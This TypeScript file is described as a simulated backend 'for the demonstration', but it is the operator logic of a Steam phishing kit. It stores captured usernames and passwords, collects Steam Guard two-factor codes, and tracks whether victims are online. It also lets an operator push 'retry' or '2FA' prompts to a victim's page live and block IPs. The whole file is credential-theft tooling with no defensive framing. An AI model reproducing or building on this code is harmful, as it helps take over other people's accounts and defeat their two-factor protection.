
// This file simulates a backend API for the demonstration

// Store for captured credentials
let capturedCredentials: any[] = [];
let adminActions: Record<string, string> = {};
let blockedIPs: string[] = []; // Store blocked IPs
let activeUsers: Record<string, boolean> = {}; // Track online users

// Mock IP addresses (in real world, this would be determined by the server)
const generateMockIP = () => {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

// Mock API response handler
const handleApiRequest = async (url: string, options: RequestInit = {}) => {
  // Simulate network delay
  await new Promise(resolve => setTimeout(resolve, 500));
  
  // Parse the URL to determine the endpoint
  const endpoint = url.split('?')[0];
  
  // Handle different endpoints
  if (endpoint === '/api/store-credentials') {
    console.log("Storing credentials:", options.body);
    try {
      const data = JSON.parse(options.body as string);
      const ip = generateMockIP(); // In a real app, this would be the client's IP
      
      const newCredential = {
        ...data,
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        ip: ip,
        status: 'pending',
        online: true
      };
      
      // Check if IP is blocked
      if (blockedIPs.includes(ip)) {
        console.log("Blocked IP attempted login:", ip);
        return { success: false, error: "IP blocked", blocked: true };
      }
      
      // Add the credential to our data store
      capturedCredentials.push(newCredential);
      activeUsers[newCredential.id] = true; // Mark user as online
      
      console.log("Credentials stored successfully:", newCredential);
      console.log("All credentials:", capturedCredentials);
      return { success: true, credential: newCredential };
    } catch (error) {
      console.error("Error storing credentials:", error);
      return { success: false, error: "Failed to parse credentials" };
    }
  }
  
  if (endpoint === '/api/store-steamguard') {
    const data = JSON.parse(options.body as string);
    const code = data.code;
    const username = data.username;
    
    console.log("Storing Steam Guard code for user:", username, "code:", code);
    
    // Find the credential with the matching username and update it
    capturedCredentials = capturedCredentials.map(cred => {
      if (cred.username === username) {
        return {
          ...cred,
          steamguard: code,
          status: 'completed'
        };
      }
      return cred;
    });
    
    console.log("Updated credentials after Steam Guard:", capturedCredentials);
    return { success: true };
  }
  
  if (endpoint === '/api/check-admin-action') {
    // Extract username from query params
    const params = new URLSearchParams(url.split('?')[1]);
    const username = params.get('username');
    
    if (username && adminActions[username]) {
      const action = adminActions[username];
      // Clear the action after it's been read
      delete adminActions[username];
      return { action };
    }
    return { action: null };
  }
  
  if (endpoint === '/api/get-credentials') {
    console.log("Returning credentials:", capturedCredentials);
    return capturedCredentials;
  }
  
  if (endpoint === '/api/set-admin-action') {
    const data = JSON.parse(options.body as string);
    adminActions[data.username] = data.action;
    
    // Update status in capturedCredentials
    capturedCredentials = capturedCredentials.map(cred => {
      if (cred.username === data.username) {
        return {
          ...cred,
          status: data.action === 'retry' ? 'rejected' : 
                 data.action === 'steam-guard' ? 'awaiting_2fa' : cred.status
        };
      }
      return cred;
    });
    
    return { success: true };
  }
  
  if (endpoint === '/api/set-user-offline') {
    const data = JSON.parse(options.body as string);
    const userId = data.userId;
    
    if (userId && activeUsers[userId]) {
      activeUsers[userId] = false;
      
      // Update online status in capturedCredentials
      capturedCredentials = capturedCredentials.map(cred => {
        if (cred.id === userId) {
          return {
            ...cred,
            online: false
          };
        }
        return cred;
      });
    }
    
    return { success: true };
  }
  
  if (endpoint === '/api/block-ip') {
    const data = JSON.parse(options.body as string);
    const ip = data.ip;
    
    if (ip && !blockedIPs.includes(ip)) {
      blockedIPs.push(ip);
      console.log("IP blocked:", ip);
      console.log("All blocked IPs:", blockedIPs);
      
      // Update status for all credentials with this IP
      capturedCredentials = capturedCredentials.map(cred => {
        if (cred.ip === ip) {
          return {
            ...cred,
            status: 'blocked'
          };
        }
        return cred;
      });
    }
    
    return { success: true, blockedIPs };
  }
  
  // Default fallback
  return { error: 'Endpoint not found' };
};

// Intercept fetch calls and route to our mock API
const originalFetch = window.fetch;
window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = typeof input === 'string' ? input : input.toString();
  
  // Only intercept API calls
  if (url.startsWith('/api/')) {
    try {
      console.log(`Intercepted API call to ${url}`);
      const response = await handleApiRequest(url, init);
      console.log(`API response for ${url}:`, response);
      return {
        ok: true,
        status: 200,
        json: async () => response,
        text: async () => JSON.stringify(response)
      } as Response;
    } catch (error) {
      console.error(`Error handling API call to ${url}:`, error);
      return {
        ok: false,
        status: 500,
        json: async () => ({ error: 'Internal error' }),
        text: async () => JSON.stringify({ error: 'Internal error' })
      } as Response;
    }
  }
  
  // For all other requests, use the original fetch
  return originalFetch(input, init);
};

// Handle user going offline
window.addEventListener('beforeunload', () => {
  // In a real app, we would send a request to the server to mark the user as offline
  // Here we'll do it synchronously since we're about to unload the page
  const userCredential = capturedCredentials.find(cred => activeUsers[cred.id]);
  if (userCredential) {
    activeUsers[userCredential.id] = false;
    userCredential.online = false;
  }
});

// Initialize the mock API
export const initMockApi = () => {
  console.log('Mock API initialized');
  
  // Initialize with empty data
  capturedCredentials = [];
  blockedIPs = [];
  activeUsers = {};
};

export default {
  initMockApi
};
